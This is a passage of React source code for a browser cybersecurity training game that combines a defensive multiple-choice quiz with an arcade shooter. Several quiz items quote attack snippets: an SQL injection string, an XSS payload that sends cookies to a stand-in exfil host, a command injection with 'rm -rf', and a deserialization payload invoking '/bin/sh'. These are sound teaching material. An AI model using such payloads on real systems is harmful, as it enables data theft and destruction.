import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useAppContext } from '../context/AppContext';
import { generateCyberQuestion, getCyberConsultantFeedback } from '../services/GeminiService';
import { CybersecurityQuestion } from '../types';

// Pre-defined high-quality cybersecurity questions to ensure instant playability if offline or loading
const STATIC_QUESTIONS: CybersecurityQuestion[] = [
  {
    title: "SQL Injection (SQLi) Bypass",
    scenario: "Your web application firewall detects unusual request loads trying to bypass the primary authentication form. The following database log snippet was recaptured from the threat logs:",
    codeSnippet: "SELECT * FROM administrators WHERE username = 'admin' AND password = '' OR '1'='1';",
    options: [
      "Implement client-side length encryption on passwords before dispatching.",
      "Utilize Parameterized Queries (Prepared Statements) with Type Bindings.",
      "Change database configurations to enforce uppercase passwords.",
      "Set an admin password lockout policy of three failed attempts."
    ],
    correctIdx: 1,
    explanation: "Using Prepared Statements ensures that the SQL interpreter treats user input strictly as literal parameter data, preventing the 'OR 1=1' from modifying the query structure."
  },
  {
    title: "Cross-Site Scripting (Reflected XSS)",
    scenario: "An engineer reports a critical flaw in the search bar. Attackers can inject scripts via URLs, hijacking active administrative browser loops. The vulnerability log presents index injection parameters:",
    codeSnippet: "GET /search?q=<script>fetch('http://exfil.net/log?cookie='+document.cookie)</script> HTTP/1.1",
    options: [
      "Sanitize, contextually escape outputs, and use CSP (Content Security Policy).",
      "Block all GET requests and route search parameters via raw encrypted POST parameters.",
      "Clear CSS selectors and force browser caches to reset daily.",
      "Verify request headers on incoming queries to validate agent parameters."
    ],
    correctIdx: 0,
    explanation: "Escaping user input contextually prevents browsers from interpreting the string '<script>' as executable code. Robust Content Security Policies prevent scripts from sending cookies to external sources."
  },
  {
    title: "Command Injection Exploitation",
    scenario: "An remote network auditing utility allows server administrators to ping custom IP hosts. During an security audit, researchers found they could execute system commands subversively inside parameters:",
    codeSnippet: "ping -c 4 127.0.0.1; rm -rf /etc/systemd/cyber",
    options: [
      "Sanitize incoming arguments to parse alphanumeric values and execute commands dynamically.",
      "Inject user strings into standard template string templates before command invocation.",
      "Avoid direct system shell execution; use restricted built-in platform APIs or strict input whitelisting.",
      "Migrate server directories underneath locked system folders with restricted read privileges."
    ],
    correctIdx: 2,
    explanation: "The safest way is using solid application programming interfaces rather than spawning a general OS shell. Avoid executing inputs in raw subprocess functions."
  },
  {
    title: "JWT Token Key Hijacking",
    scenario: "A rogue agent claims to have cracked the web authentication gateway. Your DevSecOps console detects a massive surge in admin tokens signed with a weak cryptographic configuration:",
    codeSnippet: "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }\nPayload: { \"user\": \"admin\", \"privilege\": \"root\" }\nSecret: \"admin123\" // Dictionary secret key!",
    options: [
      "Rotate tokens every five minutes using automated JavaScript local intervals.",
      "Encrypt JWT payload variables in Base64 encoding using a client-side public certificate.",
      "Switch to strong asymmetric algorithms like RS256 with robust secret key entropy.",
      "Convert JWT tokens to session database models stored underneath plain text files."
    ],
    correctIdx: 2,
    explanation: "Dictionary-vulnerable secrets are trivially cracked via brute force. Upgrading to RS256 or using cryptographically secure high-entropy symmetric credentials ensures tokens cannot be fake-signed."
  },
  {
    title: "Phishing & Domain Spoofing Attacks",
    scenario: "Security monitoring triggers an alert for an incoming staff email originating from an suspect domain. The header lists confusing route maps to bypass email protocols:",
    codeSnippet: "From: \"IT Support Helpdesk\" <security@g00gle.support.com>\nReply-To: support@system-recovery-audit.ru",
    options: [
      "Install client desktop screenshot analytics tools on all staff computers.",
      "Enforce rigorous MFA, configure DKIM, SPF, and DMARC system records.",
      "Request staff to manually verify reply addresses on critical emails.",
      "Configure internal routing to parse email payloads through static regex limits."
    ],
    correctIdx: 1,
    explanation: "Configuring SPF, DKIM, and DMARC prevents hackers from sending spoofed emails from your authentic business domain and flags fake senders automatically."
  },
  {
    title: "Insecure Deserialization Vulnerability",
    scenario: "Your application logs capture system faults from the inventory reporting engine. Threat analysis indicates users are sending structured serialized payloads that instantiate arbitrary server-side code execution:",
    codeSnippet: "O:14:\"InventoryClass\":3:{s:13:\"*inventoryId\";i:441;s:15:\"*backupFilePath\";s:26:\"/dev/null; /bin/sh shell.sh\";}",
    options: [
      "Convert raw strings to JSON payloads and apply safe whitelist properties during parsers.",
      "Use base64 strings to pass data fields to backend microservices.",
      "Apply localized encryption blocks on database rows before query storage.",
      "Restrict admin access to users with active workspace permissions."
    ],
    correctIdx: 0,
    explanation: "Insecure deserialization of arbitrary objects allows remote code command execution. JSON is safer since it represents data fields statically rather than executable classes."
  },
  {
    title: "Broken Object Level Authorization (BOLA)",
    scenario: "A cybersecurity researcher reports that arbitrary users can read other people's cloud backup files by altering natural number ID variables in GET queries:",
    codeSnippet: "GET /api/v1/backups/10892 HTTP/1.1\n// Changing 10892 to 10893 reads external data records!",
    options: [
      "Use random client browser agents to request file downloads.",
      "Encrypt backup files on the fly and deliver them as complex hex objects.",
      "Implement access token context validations to match user identity on each object record query.",
      "Set server query timeouts of 500ms to slow down manual parameter alteration."
    ],
    correctIdx: 2,
    explanation: "Broken Object Level Authorization (commonly IDOR) occurs when authorizations are not verified on the database instance level. Backend query permissions must match the authenticated session."
  }
];

// Synth sounds helper using Web Audio API
const playLaserChirp = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'sine';
    osc.frequency.setValueAtTime(450, now);
    osc.frequency.exponentialRampToValueAtTime(1100, now + 0.16);
    
    gain.gain.setValueAtTime(0.25 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.16);
    
    osc.start(now);
    osc.stop(now + 0.16);
  } catch (e) {}
};

const playGlitchBuzz = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'sawtooth';
    osc.frequency.setValueAtTime(140, now);
    osc.frequency.setValueAtTime(70, now + 0.12);
    
    gain.gain.setValueAtTime(0.35 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.24);
    
    osc.start(now);
    osc.stop(now + 0.24);
  } catch (e) {}
};

const playAlarmWarning = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'square';
    osc.frequency.setValueAtTime(320, now);
    osc.frequency.setValueAtTime(180, now + 0.1);
    
    gain.gain.setValueAtTime(0.2 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.22);
    
    osc.start(now);
    osc.stop(now + 0.22);
    
    // Play second beep
    setTimeout(() => {
      try {
        const ctx2 = new AudioCtxClass();
        const osc2 = ctx2.createOscillator();
        const gain2 = ctx2.createGain();
        osc2.connect(gain2);
        gain2.connect(ctx2.destination);
        
        osc2.type = 'square';
        osc2.frequency.setValueAtTime(320, ctx2.currentTime);
        osc2.frequency.setValueAtTime(180, ctx2.currentTime + 0.1);
        
        gain2.gain.setValueAtTime(0.2 * master, ctx2.currentTime);
        gain2.gain.exponentialRampToValueAtTime(0.01, ctx2.currentTime + 0.22);
        
        osc2.start();
        osc2.stop(ctx2.currentTime + 0.22);
      } catch (err) {}
    }, 150);
  } catch (e) {}
};

const playShootLaserSound = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'sawtooth';
    osc.frequency.setValueAtTime(600, now);
    osc.frequency.exponentialRampToValueAtTime(150, now + 0.12);
    
    gain.gain.setValueAtTime(0.12 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
    
    osc.start(now);
    osc.stop(now + 0.12);
  } catch (e) {}
};

const playBlastExplosionSound = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(120, now);
    osc.frequency.linearRampToValueAtTime(15, now + 0.25);
    
    gain.gain.setValueAtTime(0.2 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
    
    osc.start(now);
    osc.stop(now + 0.25);
  } catch (e) {}
};

const playCorrectAnswerSound = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    osc.type = 'sine';
    osc.frequency.setValueAtTime(523.25, now); // C5
    osc.frequency.exponentialRampToValueAtTime(1046.5, now + 0.35); // C6 sweep upward smoothly
    
    gain.gain.setValueAtTime(0.18 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.35);
    
    osc.start(now);
    osc.stop(now + 0.35);

    // Play a secondary accent note
    setTimeout(() => {
      try {
        const ctx2 = new AudioCtxClass();
        const osc2 = ctx2.createOscillator();
        const gain2 = ctx2.createGain();
        osc2.connect(gain2);
        gain2.connect(ctx2.destination);
        
        osc2.type = 'sine';
        osc2.frequency.setValueAtTime(1318.51, ctx2.currentTime); // E6 high accent chime!
        
        gain2.gain.setValueAtTime(0.12 * master, ctx2.currentTime);
        gain2.gain.exponentialRampToValueAtTime(0.01, ctx2.currentTime + 0.25);
        
        osc2.start();
        osc2.stop(ctx2.currentTime + 0.25);
      } catch (err) {}
    }, 150);
  } catch (e) {}
};

const playIncorrectAnswerSound = (soundConfig?: any) => {
  if (soundConfig && !soundConfig.enabled) return;
  const master = soundConfig ? soundConfig.masterVolume : 1.0;
  try {
    const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioCtxClass();
    const osc1 = ctx.createOscillator();
    const osc2 = ctx.createOscillator();
    const gain = ctx.createGain();
    
    osc1.connect(gain);
    osc2.connect(gain);
    gain.connect(ctx.destination);
    
    const now = ctx.currentTime;
    
    // Buzzing disharmonious dual sawtooth waves
    osc1.type = 'sawtooth';
    osc2.type = 'sawtooth';
    
    osc1.frequency.setValueAtTime(180, now);
    osc1.frequency.linearRampToValueAtTime(75, now + 0.45);
    
    osc2.frequency.setValueAtTime(184, now); // slightly detuned for chorus fatness
    osc2.frequency.linearRampToValueAtTime(77, now + 0.45);
    
    gain.gain.setValueAtTime(0.24 * master, now);
    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.45);
    
    osc1.start(now);
    osc2.start(now);
    
    osc1.stop(now + 0.45);
    osc2.stop(now + 0.45);
  } catch (e) {}
};

const DIFFICULTY_SETTINGS = {
  easy: {
    questionTimerSpeed: 30,
    questionsTarget: 3,
    threatSpawnInterval: 35
  },
  medium: {
    questionTimerSpeed: 20,
    questionsTarget: 5,
    threatSpawnInterval: 25
  },
  hard: {
    questionTimerSpeed: 10,
    questionsTarget: 10,
    threatSpawnInterval: 15
  }
};

export const CybersecurityGame: React.FC = () => {
  const { collisionState, cameraControlsEnabled, getSessionStateJson, cyberScore, setCyberScore, soundConfig, firewallHealth, setFirewallHealth } = useAppContext();
  
  // Difficulty Selection State: easy | medium | hard
  const [difficulty, setDifficulty] = useState<'easy' | 'medium' | 'hard'>(() => {
    try {
      return (localStorage.getItem('cyber_difficulty') as 'easy' | 'medium' | 'hard') || 'medium';
    } catch {
      return 'medium';
    }
  });

  // Track objective questions count
  const [resolvedQuestionsCount, setResolvedQuestionsCount] = useState<number>(0);
  const [missionCompleted, setMissionCompleted] = useState<boolean>(false);

  // Mission Briefing state (Persisted in localStorage so they don't get forced to read repeatedly unless they want to)
  const [briefingAccepted, setBriefingAccepted] = useState<boolean>(() => {
    try {
      return localStorage.getItem('cyber_briefing_accepted') === 'true';
    } catch {
      return false;
    }
  });

  const acceptBriefing = () => {
    playCorrectAnswerSound(soundConfig);
    setBriefingAccepted(true);
    try {
      localStorage.setItem('cyber_briefing_accepted', 'true');
    } catch {}
  };

  // Game States
  const level = Math.floor(cyberScore / 40) + 1;
  const [threatCategory, setThreatCategory] = useState<string>("SYSTEM ALL-GOOD");
  
  // Custom timer
  const [timeToNextThreat, setTimeToNextThreat] = useState<number>(25); // counts down, on 0 pop out threat
  const [isThreatModalOpen, setIsThreatModalOpen] = useState<boolean>(false);
  const [cyberCriticalSystemOverride, setCyberCriticalSystemOverride] = useState<boolean>(false);

  const changeDifficulty = (newDiff: 'easy' | 'medium' | 'hard') => {
    setDifficulty(newDiff);
    try {
      localStorage.setItem('cyber_difficulty', newDiff);
    } catch {}
    // Reset scanner clock timer to matching interval
    const spawnSeconds = DIFFICULTY_SETTINGS[newDiff].threatSpawnInterval;
    setTimeToNextThreat(spawnSeconds);
  };
  
  // Active Question
  const [activeQuestion, setActiveQuestion] = useState<CybersecurityQuestion | null>(null);
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  const [answerSubmitted, setAnswerSubmitted] = useState<boolean>(false);
  const [answerResult, setAnswerResult] = useState<'correct' | 'incorrect' | null>(null);

  // --- NEW: Question Time Limit System ---
  const [questionTimer, setQuestionTimer] = useState<number>(20);
  const [timeOutExpired, setTimeOutExpired] = useState<boolean>(false);

  // --- NEW: Cyber-Shooter Arcade system ---
  interface ActiveTarget {
    id: string;
    name: string;
    x: number;
    y: number;
    vX: number;
    vY: number;
    size: number;
    maxHp: number;
    hp: number;
    type: 'trojan' | 'spyware' | 'ransomware' | 'worm' | 'phish';
  }

  interface ShootLaser {
    id: string;
    targetX: number;
    targetY: number;
    time: number;
    opacity: number;
  }

  interface ExplosionParticle {
    id: string;
    x: number;
    y: number;
    vX: number;
    vY: number;
    color: string;
    size: number;
    opacity: number;
  }

  interface FloatingText {
    id: string;
    text: string;
    x: number;
    y: number;
    opacity: number;
  }

  const [targets, setTargets] = useState<ActiveTarget[]>([]);
  const [lasers, setLasers] = useState<ShootLaser[]>([]);
  const [particles, setParticles] = useState<ExplosionParticle[]>([]);
  const [floatingTexts, setFloatingTexts] = useState<FloatingText[]>([]);
  
  // AI States
  const [consultantData, setConsultantData] = useState<string | null>(null);
  const [isConsulting, setIsConsulting] = useState<boolean>(false);
  const [isGeneratingLiveQuestion, setIsGeneratingLiveQuestion] = useState<boolean>(false);
  
  // Options mapping
  const CATEGORIES = ["Web Exploits", "Host Injection", "Server Cryptography", "Network Probes", "Social Tactics"];
  
  // Use stable ref to prevent closure bugs
  const activeQuestionRef = useRef<CybersecurityQuestion | null>(null);
  activeQuestionRef.current = activeQuestion;

  const playThreatPopup = useCallback((customQuestion?: CybersecurityQuestion) => {
    playAlarmWarning(soundConfig);
    setIsThreatModalOpen(true);
    setAnswerSubmitted(false);
    setSelectedOption(null);
    setAnswerResult(null);
    setConsultantData(null);
    
    // Set timer dynamically from active difficulty configuration
    const baseTimer = DIFFICULTY_SETTINGS[difficulty]?.questionTimerSpeed || 20;
    setQuestionTimer(baseTimer);
    setTimeOutExpired(false);
    
    if (customQuestion) {
      setActiveQuestion(customQuestion);
      setThreatCategory(customQuestion.title);
    } else {
      // Pick random pre-defined question
      const randIdx = Math.floor(Math.random() * STATIC_QUESTIONS.length);
      setActiveQuestion(STATIC_QUESTIONS[randIdx]);
      setThreatCategory(STATIC_QUESTIONS[randIdx].title);
    }
  }, [soundConfig, difficulty]);

  // Trigger live AI generation using Gemini!
  const triggerLiveAiThreatGeneration = async (prefCategory?: string) => {
    setIsGeneratingLiveQuestion(true);
    try {
      const q = await generateCyberQuestion(prefCategory);
      playThreatPopup(q);
    } catch (err) {
      console.warn("Failed to generate live dynamic question via Gemini. Falling back to matrix static library.", err);
      // Fallback
      playThreatPopup();
    } finally {
      setIsGeneratingLiveQuestion(false);
    }
  };

  // Run Vulnerability analysis with Gemini API on current threat!
  const askGeminiAnalyzer = async () => {
    if (!activeQuestion) return;
    setIsConsulting(true);
    setConsultantData(null);
    try {
      const feedback = await getCyberConsultantFeedback(
        activeQuestion.title,
        activeQuestion.scenario,
        activeQuestion.codeSnippet
      );
      setConsultantData(feedback);
    } catch (err) {
      setConsultantData("### CONNECTION LOST TO GATEWAY CONSULTANT\n\nFallback security guidelines: review the query for parameter escaping, validation methods, or asymmetric keys.");
    } finally {
      setIsConsulting(false);
    }
  };

  // Handle Answer submissions
  const handleAnswerSubmit = () => {
    if (selectedOption === null || !activeQuestion) return;
    
    setAnswerSubmitted(true);
    
    if (selectedOption === activeQuestion.correctIdx) {
      playCorrectAnswerSound(soundConfig);
      setAnswerResult('correct');
      setCyberScore(cyberScore + 10);
      setFirewallHealth(prev => Math.min(100, prev + 15));
    } else {
      playIncorrectAnswerSound(soundConfig);
      setAnswerResult('incorrect');
      setFirewallHealth(prev => {
        const nextH = Math.max(0, prev - 25);
        if (nextH <= 0) {
          // Trigger critical takeover event
          setTimeout(() => {
            setCyberCriticalSystemOverride(true);
          }, 800);
        }
        return nextH;
      });
    }
  };

  // Skip / Shield force bypass (Dodge option)
  const forceDeployFieldBypass = () => {
    playIncorrectAnswerSound(soundConfig);
    setFirewallHealth(prev => Math.max(0, prev - 20));
    setThreatCategory("COGNITIVE BYPASS APPLIED");
    setIsThreatModalOpen(false);
    setAnswerSubmitted(false);
    setSelectedOption(null);
    setAnswerResult(null);
    setConsultantData(null);

    // Increment resolved count
    setResolvedQuestionsCount(prev => {
      const next = prev + 1;
      const target = DIFFICULTY_SETTINGS[difficulty]?.questionsTarget || 5;
      if (next >= target) {
        setMissionCompleted(true);
      }
      return next;
    });
  };

  // Reboot override
  const rebootSystemsAndRestore = () => {
    playCorrectAnswerSound(soundConfig);
    setFirewallHealth(100);
    setCyberCriticalSystemOverride(false);
    setIsThreatModalOpen(false);
    setThreatCategory("FIREWALL REBOOTED");
    setResolvedQuestionsCount(0);
    setMissionCompleted(false);
  };

  // Check collision events trigger threats
  useEffect(() => {
    if (collisionState === 'colliding' && !isThreatModalOpen && !cyberCriticalSystemOverride && briefingAccepted) {
      // Smashed into a cyberspace core structure! Trigger threat instantly!
      playThreatPopup();
    }
  }, [collisionState, playThreatPopup, isThreatModalOpen, cyberCriticalSystemOverride, briefingAccepted]);

  // Main threat generation timer during standard flight
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (!isThreatModalOpen && !cyberCriticalSystemOverride && cameraControlsEnabled && briefingAccepted && !missionCompleted) {
      timer = setInterval(() => {
        setTimeToNextThreat(prev => {
          if (prev <= 1) {
            // Trigger popup
            playThreatPopup();
            const spawnSecs = DIFFICULTY_SETTINGS[difficulty]?.threatSpawnInterval || 25;
            return spawnSecs; // Reset scanning timer dynamically
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [isThreatModalOpen, cyberCriticalSystemOverride, cameraControlsEnabled, playThreatPopup, briefingAccepted, difficulty, missionCompleted]);

  // --- NEW: Question Time Limit Countdown Effect ---
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isThreatModalOpen && !answerSubmitted && !cyberCriticalSystemOverride && !timeOutExpired) {
      interval = setInterval(() => {
        setQuestionTimer(prev => {
          if (prev <= 1) {
            // Detonation! Attacker executes threat
            playIncorrectAnswerSound(soundConfig);
            setAnswerSubmitted(true);
            setAnswerResult('incorrect');
            setTimeOutExpired(true);
            setFirewallHealth(health => {
              const nextH = Math.max(0, health - 25);
              if (nextH <= 0) {
                setTimeout(() => {
                  setCyberCriticalSystemOverride(true);
                }, 800);
              }
              return nextH;
            });
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isThreatModalOpen, answerSubmitted, cyberCriticalSystemOverride, timeOutExpired, soundConfig]);

  // --- NEW: Laser Firing & Cyber Hit Collision Handler ---
  const fireLasersAt = useCallback((clientXPercent: number, clientYPercent: number) => {
    playShootLaserSound(soundConfig);

    const laserId = Math.random().toString(36).substring(2, 9);
    setLasers(prev => [...prev, {
      id: laserId,
      targetX: clientXPercent,
      targetY: clientYPercent,
      time: Date.now(),
      opacity: 1.0
    }]);

    // Check intersection with any active targets (floating threat nodes)
    const hitTargetIdx = targets.findIndex(t => {
      const dx = clientXPercent - t.x;
      const dy = clientYPercent - t.y;
      return Math.sqrt(dx * dx + dy * dy) < 8.0;
    });

    if (hitTargetIdx !== -1) {
      const t = targets[hitTargetIdx];
      const nextHp = t.hp - 1;

      // Determine matching malware color code
      let colorType = "#22d3ee"; // default cyan
      if (t.type === 'ransomware') {
        colorType = "#f43f5e";
      } else if (t.type === 'worm') {
        colorType = "#a855f7";
      } else if (t.type === 'spyware') {
        colorType = "#8b5cf6";
      } else if (t.type === 'phish') {
        colorType = "#fbbf24";
      }

      // Dispatch real-time cyber-explosion event to the WebGL2 shader canvas
      window.dispatchEvent(new CustomEvent('cyber-explosion', {
        detail: { x: t.x, y: t.y, color: colorType }
      }));

      // Generate 12 gorgeous high-velocity neon stars on impact
      const colors = ["#22d3ee", "#f43f5e", "#fbbf24", "#a855f7"];
      const newParticles: ExplosionParticle[] = [];
      for (let i = 0; i < 12; i++) {
        const angle = Math.random() * Math.PI * 2;
        const velocity = 2.0 + Math.random() * 5.5;
        newParticles.push({
          id: Math.random().toString(36).substring(2, 9),
          x: t.x,
          y: t.y,
          vX: Math.cos(angle) * velocity,
          vY: Math.sin(angle) * velocity,
          color: colors[Math.floor(Math.random() * colors.length)],
          size: 2 + Math.random() * 3,
          opacity: 1.0
        });
      }
      setParticles(prev => [...prev, ...newParticles]);

      if (nextHp <= 0) {
        playBlastExplosionSound(soundConfig);
        // Reward 5 cybersecurity credits - called strictly outside any nested callback/reducer!
        setCyberScore(cyberScore + 5);

        // Trigger floating secure message
        const textId = Math.random().toString(36).substring(2, 9);
        setFloatingTexts(p => [...p, {
          id: textId,
          text: `+5 CYBER CREDS: [${t.name.toUpperCase()}]`,
          x: t.x,
          y: t.y - 4,
          opacity: 1.5
        }]);
      }

      // Update the hit target in the list
      setTargets(prev => prev.map(item => {
        if (item.id === t.id) {
          return { ...item, hp: nextHp };
        }
        return item;
      }).filter(item => item.hp > 0));
    }
  }, [targets, cyberScore, setCyberScore, soundConfig]);

  // --- NEW: Smooth Game Loop for particles and drifting movement ---
  useEffect(() => {
    let animId: number;
    let lastTime = performance.now();

    const tick = (now: number) => {
      const dt = Math.min((now - lastTime) / 1000, 0.1);
      lastTime = now;

      // 1. Move active threats
      setTargets(prev => 
        prev.map(target => {
          let nextX = target.x + target.vX * dt * 35;
          let nextY = target.y + target.vY * dt * 35;
          let nextVx = target.vX;
          let nextVy = target.vY;

          if (nextX < 12) { nextX = 12; nextVx = Math.abs(target.vX); }
          if (nextX > 88) { nextX = 88; nextVx = -Math.abs(target.vX); }
          if (nextY < 18) { nextY = 18; nextVy = Math.abs(target.vY); }
          if (nextY > 75) { nextY = 75; nextVy = -Math.abs(target.vY); }

          // Add sinusoidal floating drift
          nextY += Math.sin(now * 0.002 + target.x) * 0.06;

          return { ...target, x: nextX, y: nextY, vX: nextVx, vY: nextVy };
        })
      );

      // 2. Animate and fade out laser beam tracks
      setLasers(prev => 
        prev
          .map(l => ({ ...l, opacity: l.opacity - dt * 5 }))
          .filter(l => l.opacity > 0.02)
      );

      // 3. Move and fade explosion particles
      setParticles(prev => 
        prev
          .map(p => ({
            ...p,
            x: p.x + p.vX * dt * 30,
            y: p.y + p.vY * dt * 30,
            opacity: p.opacity - dt * 2.2
          }))
          .filter(p => p.opacity > 0)
      );

      // 4. Animate floating scores
      setFloatingTexts(prev => 
        prev
          .map(f => ({
            ...f,
            y: f.y - dt * 10,
            opacity: f.opacity - dt * 1.2
          }))
          .filter(f => f.opacity > 0)
      );

      animId = requestAnimationFrame(tick);
    };

    animId = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(animId);
  }, []);

  // --- NEW: Malware Targets Spawner (Inter-Probe Threat Wave) ---
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (!isThreatModalOpen && !cyberCriticalSystemOverride && cameraControlsEnabled && briefingAccepted) {
      interval = setInterval(() => {
        setTargets(prev => {
          if (prev.length >= 4) return prev; // Limit to 4 floating viruses max

          const fileLibrary = [
            { name: "wannacry_payload.dll", type: "ransomware", maxHp: 3 },
            { name: "trojan.backdoor", type: "trojan", maxHp: 2 },
            { name: "stuxnet.node", type: "worm", maxHp: 3 },
            { name: "exfiltrate_agent.spy", type: "spyware", maxHp: 2 },
            { name: "phishing_lure.pdf", type: "phish", maxHp: 1 },
            { name: "ransomware.crypt", type: "ransomware", maxHp: 2 },
            { name: "keylogger_v4.sys", type: "spyware", maxHp: 2 }
          ];

          const selection = fileLibrary[Math.floor(Math.random() * fileLibrary.length)];
          if (prev.some(t => t.name === selection.name)) return prev;

          const newTarget: ActiveTarget = {
            id: Math.random().toString(36).substring(2, 9),
            name: selection.name,
            x: 15 + Math.random() * 70,
            y: 20 + Math.random() * 50,
            vX: (Math.random() > 0.5 ? 1 : -1) * (0.4 + Math.random() * 0.4),
            vY: (Math.random() > 0.5 ? 1 : -1) * (0.3 + Math.random() * 0.4),
            size: 58 + Math.random() * 14,
            maxHp: selection.maxHp,
            hp: selection.maxHp,
            type: selection.type as any
          };

          return [...prev, newTarget];
        });
      }, 4000); // Check and spawn a new target bubble every 4 seconds
    }
    return () => clearInterval(interval);
  }, [isThreatModalOpen, cyberCriticalSystemOverride, cameraControlsEnabled, briefingAccepted]);

  // --- NEW: Spacebar Autofire Hook ---
  useEffect(() => {
    const handleSpaceFire = (e: KeyboardEvent) => {
      if (e.key === " " || e.key === "Spacebar") {
        if ((e.target as HTMLElement).matches('input, textarea, select')) return;
        if (isThreatModalOpen || cyberCriticalSystemOverride || !cameraControlsEnabled || !briefingAccepted) return;

        // Autofire towards center or locked target
        if (targets.length > 0) {
          let closest = targets[0];
          let minDist = 99999;
          targets.forEach(t => {
            const dx = t.x - 50;
            const dy = t.y - 50;
            const d = dx * dx + dy * dy;
            if (d < minDist) {
              minDist = d;
              closest = t;
            }
          });
          // Fire with slight inaccuracy/variation for realism
          fireLasersAt(closest.x + (Math.random() * 3 - 1.5), closest.y + (Math.random() * 3 - 1.5));
        } else {
          // Fire straight into crosshair center
          fireLasersAt(50 + (Math.random() * 4 - 2), 50 + (Math.random() * 4 - 2));
        }
      }
    };

    window.addEventListener('keydown', handleSpaceFire);
    return () => window.removeEventListener('keydown', handleSpaceFire);
  }, [isThreatModalOpen, cyberCriticalSystemOverride, cameraControlsEnabled, targets, fireLasersAt, briefingAccepted]);

  return (
    <>
      {/* 0. FULL VIEWPORT CYBERSPACE TARGET SHOOTER & DUBAI AFTERNOON SKYLINE BACKDROP */}
      {!isThreatModalOpen && !cyberCriticalSystemOverride && cameraControlsEnabled && briefingAccepted && (
        <div 
          className="fixed inset-0 z-10 pointer-events-auto cursor-crosshair overflow-hidden select-none"
          onClick={(e) => {
            // Avoid firing if they click HUD items, stats or re-route buttons
            const target = e.target as HTMLElement;
            if (target.closest('button') || target.closest('a') || target.closest('input') || target.closest('#cybersecurity-hud')) return;
            
            // Calculate click percentage coords relative to screen boundaries
            const x = (e.clientX / window.innerWidth) * 100;
            const y = (e.clientY / window.innerHeight) * 100;
            fireLasersAt(x, y);
          }}
        >
          {/* Dubai Afternoon Skyline Vector Backdrop (Burj Khalifa Sillhouette, golden rays, Marina clusters) */}
          <svg className="absolute bottom-[35px] left-0 w-full h-[36vh] pointer-events-none z-0 overflow-hidden opacity-50 mix-blend-screen select-none" viewBox="0 0 1440 280" preserveAspectRatio="none">
            <defs>
              <linearGradient id="dubaiSkyGradient" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#f59e0b" stopOpacity="0.25" />
                <stop offset="50%" stopColor="#ea580c" stopOpacity="0.10" />
                <stop offset="100%" stopColor="#000000" stopOpacity="0" />
              </linearGradient>
              <linearGradient id="towerGoldGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#fef08a" stopOpacity="0.55" />
                <stop offset="60%" stopColor="#f59e0b" stopOpacity="0.25" />
                <stop offset="100%" stopColor="#b45309" stopOpacity="0.05" />
              </linearGradient>
              <linearGradient id="burjKhalifaGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#38bdf8" stopOpacity="0.65" />
                <stop offset="35%" stopColor="#fbbf24" stopOpacity="0.30" />
                <stop offset="100%" stopColor="#ea580c" stopOpacity="0.05" />
              </linearGradient>
            </defs>

            {/* Ambient sun rays filter */}
            <circle cx="720" cy="160" r="150" fill="#fef08a" opacity="0.12" filter="blur(25px)" />
